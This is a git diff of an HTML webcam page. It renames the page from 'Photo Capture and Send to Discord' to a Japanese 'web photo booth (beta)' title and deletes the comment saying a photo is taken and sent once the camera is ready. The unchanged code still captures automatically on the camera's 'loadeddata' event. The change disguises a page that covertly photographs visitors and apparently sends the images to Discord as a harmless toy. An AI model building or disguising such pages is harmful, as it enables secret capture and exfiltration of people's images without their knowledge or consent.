@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Capture and Send to Discord</title>
+    <title>web版プリクラ（β版）</title>
 </head>
 <body>
-    <h1>Photo Capture and Send to Discord</h1>
+    <h1>web版プリクラ（β版）</h1>
     <video id="video" autoplay playsinline style="border: 1px solid black; width: 300px; height: auto;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <h2>Captured Photo:</h2>
@@ -26,7 +26,7 @@
             .then(stream => {
                 video.srcObject = stream;
 
-                // カメラ準備後、写真を撮影して送信
+                
                 video.addEventListener('loadeddata', capturecam, { once: true });
             })
             .catch(err => {
